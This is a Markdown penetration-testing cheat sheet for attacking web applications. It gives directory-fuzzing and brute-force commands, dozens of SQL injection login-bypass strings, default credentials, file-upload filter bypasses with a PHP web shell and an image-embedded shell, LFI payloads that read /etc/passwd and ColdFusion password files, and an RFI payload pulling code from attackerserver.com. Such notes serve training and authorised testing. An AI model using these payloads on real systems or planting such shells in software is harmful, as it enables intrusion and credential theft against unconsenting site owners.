# WEB

## Use [curl](https://www.kali.org/tools/curl/)

```shell
curl [options] <url>
```

## Use [wget](https://www.kali.org/tools/wget/)

```shell
wget [options] <url>
```

## Scan for directories

[wfuzz](https://www.kali.org/tools/wfuzz/)

```
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 <url>/FUZZ
```

[ffuf](https://www.kali.org/tools/ffuf/)

```shell
ffuf -w <wordlist> -u <url>/FUZZ
```

[dirb](https://www.kali.org/tools/dirb/)

```shell
dirb <url> <wordlist>
```

[dirbuster](https://www.kali.org/tools/dirbuster/)

```shell
java -jar DirBuster-1.0-RC1.jar -u <url>
```

[gobuster](https://www.kali.org/tools/gobuster/)

```shell
gobuster -u <url> -w <wordlist> dir
```

[nikto](https://www.kali.org/tools/nikto/)

```shell
nikto -h <hostname> –output <filename>
```

[dirsearch](https://www.kali.org/tools/dirsearch/)

```shell
dirsearch -u <url>
```

## Bruteforce subdomain

## Bruteforce credentials

[wfuzz](https://www.kali.org/tools/wfuzz/)

```shell
wfuzz -w <wordlist> -L 20 -d "username=FUZZ&password=FUZZ" -hw 1224 <url> page path
```

[BurpSuite — sniper/cluster bomb](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/attack-types)

## SQL Injection

- [sqlmap](https://www.kali.org/tools/sqlmap/)

    ```shell
    sqlmap -u <url> --dbs
    ```

    ```shell
    sqlmap -u <url> --crawl=1
    ```

- Enum using nmap

    ```shell
    nmap -sV --script=http-sql-injection <target>
    ```

- <http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet>

- Login bypass

    `‘or 1=1- -`

    `‘ or ‘1’=1`

    `‘ or ‘1’=1 - -`

    `‘–`

    `' or '1'='1`

    `-'`

    `' '`

    `'&'`

    `'^'`

    `'*'`

    `' or ''-'`

    `' or '' '`

    `' or ''&'`

    `' or ''^'``

    `' or ''*'

    `"-"`

    `" "`

    `"&"`

    `"^"`

    `"*"`

    `" or ""-"`

    `" or "" "`

    `" or ""&"`

    `" or ""^"`

    `" or ""*"`

    `or true--`

    `" or true--`

    `' or true--`

    `") or true--`

    `') or true--`

    `' or 'x'='x`
    
    `') or ('x')=('x`

    `')) or (('x'))=(('x`

    `" or "x"="x`

    `") or ("x")=("x`

    `")) or (("x"))=(("x`

    - known Username:

        `admin’ - -`

        `admin’) - -`

- Using error-bases DB enumeration

    - Add the tick `'`

    - Enumerate columns

- Using order by: <https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html>

## XML External Entity (XXE)

## URL vulnerability

## OS command Injection

## Directory traversal

## Dotdotpwn tool

## Looking for:

- `.git`

- `robots.txt`

## If https

- scan for heartbleed

    - `sslscan <hostname:port>`

    - `nmap -sV --script=ssl-heartbleed <hostname>`

## If it's a CMS

- Wordpress

    - [wpscan](https://www.kali.org/tools/wpscan/)

    - `wpscan -u <url> --enumerate -t --enumerate u --enumerate p`

    - `wpscan –u <url> --username <name> --wordlist <wordlist>`

    - `wpscan -u <url> --random-agent`

    - `/wp-admin`

    - `/wp-login`

    - `setup-config.php`

    - `wp-config.php`

- Drupal

    - [droopescan](https://github.com/SamJoan/droopescan)

    - `/CHANGELOG.txt` to find version

- Adobe Cold Fusion

    - `/CFIDE/adminapi/base.cfc?wsdl`

    - `exploit/windows/http/coldfusion_fckeditor`

    - LFI: `http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`

- Elastix

    -  `/vtigercrm`: `admin:admin`

    - able to upload shell in profile-photo

    - Examine `httpd.conf/` windows config files

- JBoss

    - JMX Console `http://IP:8080/jmxconcole/`

    - War File

- Joomla

    - `/administrator`

    - `configuration.php`

    - `diagnostics.php`

    - `joomla.inc.php`

    - `config.inc.php`

- Mambo

    - `configuration.php`

    - `config.inc.php`

- ZyXel

    - `/WAN.html` (contains PPPoE ISP password)

    - `/WLAN_General.html` and `/WLAN.html` (contains WEP key)

    - `/rpDyDNS.html` (contains DDNS credentials)

    - `/Firewall_DefPolicy.html` (Firewall)

    - `/CF_Keyword.html` (Content Filter)

    - `/RemMagWWW.html` (Remote MGMT)

    - `/rpSysAdmin.html` (System)

    - `/LAN_IP.html` (LAN)

    - `/NAT_General.html` (NAT)

    - `/ViewLog.html` (Logs)

    - `/rpFWUpload.html` (Tools)

    - `/DiagGeneral.html` (Diagnostic)

    - `/RemMagSNMP.html` (SNMP Passwords)

    - `/LAN_ClientList.html` (Current DHCP Leases)

    - `/RestoreCfg.html`

    - `/BackupCfg.html`

## Upload page

- Upload shell to make reverse shell

- Bypass file upload filtering

- Rename it

    - `shell.php.jpg`

- Blacklisting bypass, change extension

    - php: `.pht`, `.phpt`, `.phtml`, `.php`, `.php3`, `.php4`, `.php5`, `.php6`, `.inc`

    - asp: `.asp`, `.aspx`

    - perl: `.pl`, `.pm`, `.cgi`, `.lib`

    - jsp: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`

    - Coldfusion: `.cfm`, `.cfml`, `.cfc`, `.dbm`

- Whitelisting bypass

    - `file.php%00.png`

    - `shell.jpg.php`

    - If they check the content. Basically you can just add the text "GIF89a;" before your shell-code. `<? system($_GET['cmd']); //or you can insert your complete shellcode ?>`

    - In image

        - `exiftool -Comment='<?php echo "<pre>"; систем($_ГЕТ['смд']); ?>' lo.jpg //censored due to antivirus aggression`

        - `mv lo.jpg lo.php.jpg`

## Phpmyadmin

- Default login `root:pma`

## Identify WAF using `wafw00f`

## Exploitation

- Heartbleed exploit

    ```
    use auxiliary/scanner/ssl/openssl_heartbleed
    set RHOSTS 192.168.3.212
    set verbose true
    run
    ```

- LFI

    - Bypassing php-execution

        - `http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index`

    - Bypassing the added .php and other extra file-endings

        - `http://example.com/page=../../../../../../etc/passwd%00`

        - `http://example.com/page=../../../../../../etc/passwd?`

    - folder that always exist

        - `/etc/hosts /etc/resolv.conf`

    - add %00jpg to end of files

        - `/etc/passwd%00jpg`

    - Refer this for more information

        - <https://sushant747.gitbooks.io/total-oscp-guide/local_file_inclusion.html>

        - <https://highon.coffee/blog/lfi-cheat-sheet/>

- RFI

    - `http://exampe.com/index.php?page=http://attackerserver.com/evil.txt`

## Other

[cewl](https://www.kali.org/tools/cewl/) — Creating wordlist from webpage

[EyeWitness](https://github.com/RedSiege/EyeWitness) — take screenshots of websites

[smbmap](https://www.kali.org/tools/smbmap/)

```shell
smbmap -H <hostname> [-u <user> -p <pass>]
```

[smbclient](https://www.kali.org/tools/samba/#smbclient)

```shell
smbclient -L //<a.b.c.d>/
```

```
-L|--list       This option allows you to look at what services are available on a server. You use it as smbclient -L host and a list should appear. The -I option may be useful if your NetBIOS names don't match your TCP/IP DNS hostnames or if you are trying to reach a host on another network.
```

```shell
smbclient //<a.b.c.d>/<dir>
```